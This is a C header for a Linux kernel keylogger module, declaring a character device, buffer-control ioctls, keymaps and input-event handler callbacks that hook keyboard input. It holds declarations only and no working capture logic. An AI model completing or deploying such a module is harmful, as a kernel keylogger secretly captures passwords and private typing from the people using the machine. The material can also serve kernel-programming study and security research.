#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/input.h>
#include <linux/mutex.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/module.h>

#define DEVICE_NAME "keylogger"
#define MAP_SIZE 256
#define MAX_BUFFER_SIZE 1024

#define IOCTL_GET_BUFFER_SIZE _IOR('k', 1, int)
#define IOCTL_GET_BUFFER_DATA _IOR('k', 2, char *)
#define IOCTL_SET_BUFFER_SIZE _IOR('k', 3, int)
#define IOCTL_CLEAR_BUFFER_DATA _IO('k', 4)

extern char map[MAP_SIZE];
extern char shift_map[MAP_SIZE];

int allocate_buffer(int size);
void free_buffer(void);
long keylogger_ioctl(struct file *file, unsigned int cmd, unsigned long arg);
int keylogger_connect(struct input_handler *handler, struct input_dev *dev,
		      const struct input_device_id *id);
void keylogger_disconnect(struct input_handle *handle);
void keylogger_event_handler(struct input_handle *handle, unsigned int type,
			     unsigned int code, int value);

#endif /* KEYLOGGER_H */